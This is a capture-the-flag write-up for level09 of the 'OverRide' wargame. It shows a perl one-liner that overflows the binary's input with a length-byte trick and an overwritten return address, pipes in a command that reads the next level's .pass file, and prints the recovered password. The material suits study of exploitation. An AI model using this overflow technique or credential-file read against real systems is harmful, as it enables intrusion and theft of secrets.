# level09

```
level09@OverRide:~$ perl -e 'print "A"x40 . "\xff" . "\n" . "A"x200 . "\x8c\x48\x55\x55\x55\x55\x00\x00" . "\n" . "cat /home/users/end/.pass"' | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
Segmentation fault (core dumped)
```
